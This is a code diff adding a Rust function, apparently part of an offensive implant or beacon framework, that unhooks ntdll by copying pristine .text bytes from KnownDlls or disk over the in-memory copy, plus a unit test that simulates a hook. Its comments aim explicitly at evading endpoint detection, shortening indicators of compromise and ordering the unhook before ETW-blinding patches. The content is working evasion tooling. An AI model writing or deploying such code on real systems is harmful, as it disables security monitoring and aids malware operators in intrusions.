@@ -770,3 +770,169 @@ pub unsafe fn text_diff_count(
     }
     diffs
 }
+
+// ===========================================================================
+// Write-back restore: overwrite the in-process (hooked) ntdll .text with the
+// pristine bytes (BRC4/s12-style unhook, the "restore" half of this module —
+// the fresh map above was previously used only as an SSN-resolution SOURCE).
+// ===========================================================================
+
+/// Restore the in-process ntdll `.text` from a pristine source.
+///
+/// Source chain (same preference as `syscalls::init_resolve_ssn_table`):
+///   1. `\KnownDlls\ntdll` SEC_IMAGE map (pristine, transient — unmapped
+///      before the write window so the IOC stays short), else
+///   2. `%SystemRoot%\System32\ntdll.dll` disk read (pristine; EDRs patch the
+///      mapped image, never the file).
+///
+/// The hooked image's OWN `.text` bounds are parsed from its headers and must
+/// equal the pristine source's (rva + size): a mismatch means the source is a
+/// different ntdll build (e.g. Windows Update swapped the file after process
+/// start) and copying it back would crash the process, so we refuse.
+///
+/// Idempotent: if zero bytes differ, the host ntdll is already pristine and NO
+/// write happens (no VirtualProtect signal, no `.text` touch); `Ok(0)` is
+/// returned. Otherwise the whole `.text` is copied back through a
+/// `PAGE_EXECUTE_READWRITE` window — kept executable so a concurrent thread
+/// fetching ntdll code mid-copy cannot fault (same convention as
+/// `blind.rs::write_patch`) — and the original protection is restored. x64
+/// i-cache is self-coherent, so no `FlushInstructionCache` is needed.
+///
+/// **Ordering constraint:** this restores EVERY byte of ntdll `.text`,
+/// including our own userland-blind patches (`EtwEventWrite`/`NtTraceEvent`
+/// byte-patches live in ntdll). Callers MUST run it BEFORE `BlindKit`; run
+/// after a byte-patch blind it silently undoes the blind.
+///
+/// Returns the number of bytes that differed before the restore (0 = already
+/// pristine, no write performed). `Err` when no pristine source is available,
+/// the hooked `.text` can't be parsed, the source/target bounds mismatch, or
+/// the protection flip fails.
+///
+/// # Safety
+/// Maps `\KnownDlls\ntdll` / reads the disk file (see `fresh_ntdll_text*`),
+/// parses the live ntdll headers, and overwrites the in-process `.text`. Call
+/// once at bootstrap from the single beacon thread (same discipline as
+/// `syscalls::init_global`).
+pub unsafe fn restore_ntdll_text() -> Result<usize, &'static str> {
+    let hooked_base =
+        crate::resolve::module_base_by_name(b"ntdll.dll").ok_or("in-process ntdll base")?;
+    let (text_rva, text_size) = parse_text_section(hooked_base).ok_or("hooked .text parse")?;
+
+    // Materialize the pristine `.text` into an owned buffer so both source
+    // arms (SEC_IMAGE map / disk file) converge on one copy path — and so the
+    // KnownDlls view is unmapped BEFORE the write window (transient IOC).
+    let pristine: Vec<u8> = match fresh_ntdll_text() {
+        Some((fresh_base, f_rva, f_size)) => {
+            if (f_rva, f_size) != (text_rva, text_size) {
+                unmap_fresh(fresh_base);
+                return Err("pristine/hooked .text bounds mismatch");
+            }
+            let bytes =
+                core::slice::from_raw_parts(fresh_base.add(text_rva as usize), text_size as usize)
+                    .to_vec();
+            unmap_fresh(fresh_base);
+            bytes
+        }
+        None => {
+            let handle = fresh_ntdll_text_disk().ok_or("no pristine ntdll source")?;
+            if handle.text_bounds() != (text_rva, text_size) {
+                return Err("pristine/hooked .text bounds mismatch");
+            }
+            // Exports are unused by `read()` — only RVA→file-offset translation.
+            let src = DiskTextSource::new(&handle, &[]);
+            let bytes = nyx_evasion::SyscallSource::read(&src, text_rva, text_size as usize);
+            if bytes.len() != text_size as usize {
+                return Err("disk ntdll .text short read");
+            }
+            bytes
+        }
+    };
+
+    let hooked_text = hooked_base.add(text_rva as usize);
+    let hooked_slice = core::slice::from_raw_parts(hooked_text, text_size as usize);
+    let diffs = pristine
+        .iter()
+        .zip(hooked_slice.iter())
+        .filter(|(a, b)| a != b)
+        .count();
+    if diffs == 0 {
+        // Already pristine — no write, no VirtualProtect IOC.
+        return Ok(0);
+    }
+
+    // Write window: PAGE_EXECUTE_READWRITE (NOT PAGE_READWRITE) so a concurrent
+    // thread fetching ntdll code mid-copy does not fault; the original
+    // protection is restored right after the copy.
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+    let vp_addr = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")
+        .ok_or("VirtualProtect unresolved")?;
+    let vp: VirtualProtect = core::mem::transmute(vp_addr);
+    let mut old: u32 = 0;
+    if vp(
+        hooked_text as *mut c_void,
+        text_size as usize,
+        PAGE_EXECUTE_READWRITE,
+        &mut old,
+    ) == 0
+    {
+        return Err("VirtualProtect RWX failed");
+    }
+    core::ptr::copy_nonoverlapping(pristine.as_ptr(), hooked_text, text_size as usize);
+    let mut dummy: u32 = 0;
+    vp(
+        hooked_text as *mut c_void,
+        text_size as usize,
+        old,
+        &mut dummy,
+    );
+    Ok(diffs)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Simulated inline hook: flip the first byte of an obscure ntdll export's
+    /// stub (`NtCreateKeyedEvent` — real since XP, never called by the test
+    /// harness, so the µs-wide patch window cannot race another thread's
+    /// execution of it), then `restore_ntdll_text()` must report the diff and
+    /// put the byte back. Runs for real under wine64 (KnownDlls SEC_IMAGE map
+    /// or the disk fallback, whichever the host grants).
+    #[test]
+    fn restore_repairs_simulated_hook() {
+        unsafe {
+            // Baseline: restore once so the pre-state is known-pristine
+            // (on an unhooked host this is the idempotent Ok(0) path).
+            restore_ntdll_text().expect("baseline restore");
+
+            let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtCreateKeyedEvent")
+                .expect("NtCreateKeyedEvent export");
+            let p = addr as *mut u8;
+            let original = *p;
+
+            // Install the "hook" through the same RWX-window convention the
+            // restore path uses (page stays executable the whole time).
+            type VirtualProtect =
+                unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+            let vp: VirtualProtect = core::mem::transmute(
+                crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")
+                    .expect("VirtualProtect export"),
+            );
+            let mut old: u32 = 0;
+            assert_ne!(vp(p as *mut c_void, 1, 0x40, &mut old), 0, "RWX window");
+            *p = original ^ 0xFF;
+            let mut dummy: u32 = 0;
+            vp(p as *mut c_void, 1, old, &mut dummy);
+            assert_eq!(*p, original ^ 0xFF, "hook byte installed");
+
+            let diffs = restore_ntdll_text().expect("restore after hook");
+            assert!(diffs >= 1, "restore must report the hooked byte");
+            assert_eq!(*p, original, "hooked byte restored to pristine");
+
+            // Post-condition: a further restore is a pure no-op.
+            let again = restore_ntdll_text().expect("post restore");
+            assert_eq!(again, 0, "already-pristine restore performs no write");
+        }
+    }
+}
